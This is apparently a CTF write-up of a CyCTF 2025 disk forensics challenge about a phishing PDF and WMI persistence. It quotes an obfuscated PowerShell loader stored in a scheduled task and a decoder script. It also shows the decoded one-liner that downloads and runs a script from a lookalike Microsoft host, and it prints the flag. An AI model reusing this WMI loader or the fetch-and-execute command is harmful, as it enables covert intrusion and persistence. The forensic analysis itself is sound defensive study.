---
title: "HiddenInPlainSight_DFIR_Challenge_From_CyCTF{2025}"
date: 2025-12-28 00:00:00
categories: [CTF_competitions]
tags: [Disk_Forensics, WMI, Medium]
toc: true
---

# HiddenInPlainSight

## Description:

An HR staff member received a phishing email from an attacker posing as an HR colleague, requesting a review of an attached résumé. This resulted in the download of a malicious PDF. Can you identify the red flags? Flag Format: CyCTF{part1_part2} FilePassword: CyCTF2025#DFIR Hash Sha256: 2420cc73d3d7be32af405929cee38bb818eaa06f48c50931c785937a7b15f9ae

in the first i am try to search to pdf file and to check if it embedded malicious macros or js code but don’t found it, after long time from investigation i found malicious Task called “MicrosoftOfficeOffice Feature Updates” contentment base64 strings encoded

```powershell
$key=0x45; try { $instance=Get-CimInstance -Namespace 'root\cimv2' -ClassName 'windowsupdate' -Filter 'Name="MyHiddenPayload"'; $xoredBytes=$instance.EncodedCommand;
$decodedBase64Bytes=foreach ($byte in $xoredBytes) { $byte -bxor $key }; $decodedBase64String=[System.Text.Encoding]::ASCII.GetString($decodedBase64Bytes);
$decodedPayload=[System.Convert]::FromBase64String($decodedBase64String); $decodedScript=[System.Text.Encoding]::ASCII.GetString($decodedPayload); Invoke-Expression $decodedScript } catch { }%

```

read object from WMI → decode byte by xor key 0x45 → decode base64 → run script
now try extract hidden object from WMI, WMI object soreded under this path
`C:\Windows\System32\wbem\Repositry`

i am usage [flare-wmi](https://github.com/mandiant/flare-wmi) to parsing data 

```bash
uv run flare-wmi/python-cim/samples/ui.py win7 Repository/

```

![Image](/assets/img/3/3_1.jpg)
![Image](/assets/img/3/3_2.jpg)


let’s go to decrypt encoded command by python script

```python
import base64

# XOR key from the PowerShell script
key = 0x45

# The bytes from the EncodedCommand property
encoded_bytes = [
    36, 18, 19, 113, 12, 6, 45, 39, 16, 118, 41, 63, 33, 2, 19, 49, 9, 41, 23, 41,
    32, 13, 20, 48, 23, 18, 112, 47, 39, 119, 23, 53, 39, 40, 33, 33, 10, 47, 53, 19,
    19, 0, 28, 113, 9, 46, 33, 41, 33, 3, 11, 117, 38, 40, 41, 48, 31, 60, 34, 42, 36, 29,
    33, 60, 12, 2, 45, 117, 33, 13, 4, 115, 9, 60, 124, 116, 38, 2, 23, 45, 33, 2, 19, 63,
    9, 40, 116, 53, 28, 118, 15, 51, 38, 63, 7, 40, 33, 6, 112, 47, 39, 119, 117, 115, 10, 1,
    4, 113, 8, 6, 124, 50, 28, 29, 15, 117, 8, 22, 124, 12, 8, 18, 20, 61, 39, 40, 38, 61,
    39, 41, 7, 54, 28, 17, 3, 48, 20, 63, 3, 11, 16, 63, 3, 43, 36, 13, 20, 51, 31, 40,
    41, 54, 31, 22, 112, 50, 38, 63, 0, 34, 9, 19, 19, 63, 31, 16, 15, 45, 38, 119, 41, 47,
    16, 2, 3, 60, 38, 119, 41, 48, 31, 60, 46, 48, 20, 119, 124, 48, 33, 2, 19, 48, 33, 6,
    46, 53
]

# Step 1: XOR decryption
xored_decoded = bytes([b ^ key for b in encoded_bytes])

# Step 2: Convert to Base64 string
base64_str = xored_decoded.decode('ascii', errors='ignore')

# Step 3: Decode Base64 to reveal payload bytes
try:
    payload_bytes = base64.b64decode(base64_str)
    decoded_script = payload_bytes.decode('ascii', errors='ignore')
except Exception as e:
    decoded_script = f"Error decoding Base64: {e}\nRaw Base64 string:\n{base64_str}"

# Step 4: Print the results safely
print("=== Base64 Decoded Script Preview ===")
print(decoded_script[:500])  # show first 500 chars to preview safely

```

# output is 

```
iex ([System.Text.Encoding]::UTF8.GetString((iwr http://updates.micros0ft.com:8080/part1/H1d1ng1nPla1nC1MS1ght/file.ps1 -UseBasicParsing).Content))

```

now i got first part of the flag in url and found an interesting point: part1 — it’s likely that the second part is marked by the phrase ‘Part2’ let’s go search in windows event I'm using chanisaw to search and parse event logs


```bash
 chainsaw search "part2" .

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By WithSecure Countercept (@FranticTyping, @AlexKornitzer)

[+] Loading forensic artefacts from: .
[+] Loaded 106 forensic files (48.9 MiB)
[+] Searching forensic artefacts...
---
Event_attributes:
  xmlns: http://schemas.microsoft.com/win/2004/08/events/event
Event:
  System:
    Provider_attributes:
      Name: Microsoft-Windows-Bits-Client
      Guid: EF1CC15B-46C1-414E-BB95-E76B077BD51E
    EventID: 16403
    Version: 0
    Level: 4
    Task: 0
    Opcode: 0
    Keywords: '0x4000000000000000'
    TimeCreated_attributes:
      SystemTime: 2025-10-01T16:58:55.248829Z
    EventRecordID: 482
    Correlation_attributes:
      ActivityID: A977B79B-2FFF-0001-8A91-78A9FF2FDC01
    Execution_attributes:
      ProcessID: 9812
      ThreadID: 12372
    Channel: Microsoft-Windows-Bits-Client/Operational
    Computer: DESKTOP-DNCNOFK
    Security_attributes:
      UserID: S-1-5-21-613517472-1506933967-4201278041-1000
  EventData:
    User: DESKTOP-DNCNOFK\localuser
    jobTitle: MyJob
    jobId: 18754CAC-E802-45BC-9FD2-2427520F1C82
    jobOwner: DESKTOP-DNCNOFK\localuser
    fileCount: 1
    RemoteName: http://updates.micros0ft.com:7070/part2/ALittleBITSofData.zip
    LocalName: C:\share\Projects\ImportantDocs.zip
    processId: 7836
    ClientProcessStartKey: 4222124650660069

---

```

## flag is: CyCTF{H1d1ng1nPla1nC1MS1ght_ALittleBITSofData}

# Thanks for Reading
